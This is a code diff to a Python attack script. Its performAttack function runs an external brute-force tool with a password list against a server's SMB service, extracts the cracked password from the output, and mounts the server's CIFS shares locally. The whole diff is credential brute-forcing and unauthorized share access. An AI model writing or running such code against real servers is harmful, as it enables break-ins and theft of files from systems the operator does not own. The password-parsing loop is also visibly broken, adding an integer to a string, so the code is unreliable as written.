@@ -23,8 +23,23 @@ def parseVulnerabilitiesFile(f):
 
 def performAttack(location, serverIP, username, password=None):
 	if (password is None):
-		password = bruteForcePassword()
-		print ("Null Password, brute forced to: " + password)
+		f=open("password.txt", "w")
+		call(["python3", "hyd.py", "-u", username, "-p", "passwd.txt", "-i", serverIP], stdout=f)
+		f.close()
+		f = open("password.txt", "r")
+		lines = f.readlines()
+		for line in lines:
+			#print (line)
+			if "[445][smb]" in line:
+				words = line.split()
+				pwdIndex = words.index("password:")
+				endWordIndex = len(words)-pwdIndex
+				password = words[pwdIndex+1]
+				for i in range(pwdIndex+1, len(password)):
+					password += pwdIndex+1
+		f.close()
+		
+		print ("Cracked Password:" + password)
 	else:
 		print ("password is " + password)
 	try:	
@@ -41,10 +56,10 @@ def performAttack(location, serverIP, username, password=None):
 	f = open('vulnerableMountPoints.txt', 'r')
 	mountpoints = parseVulnerabilitiesFile(f)
 	f.close()
-	print (mountpoints)
 	for mountpoint in mountpoints:
 		mountArgs = ["mount", "-t", "cifs", "-o", "username=" + username + ",password=" + password, "//" + serverIP + "/" + mountpoint, location]
 		call(mountArgs)
+		print ("remote filesystem " + serverIP + "/" + mountpoint + "is mounted at " + location)
 
 def bruteForcePassword():
 	return "bruteForcePassword"
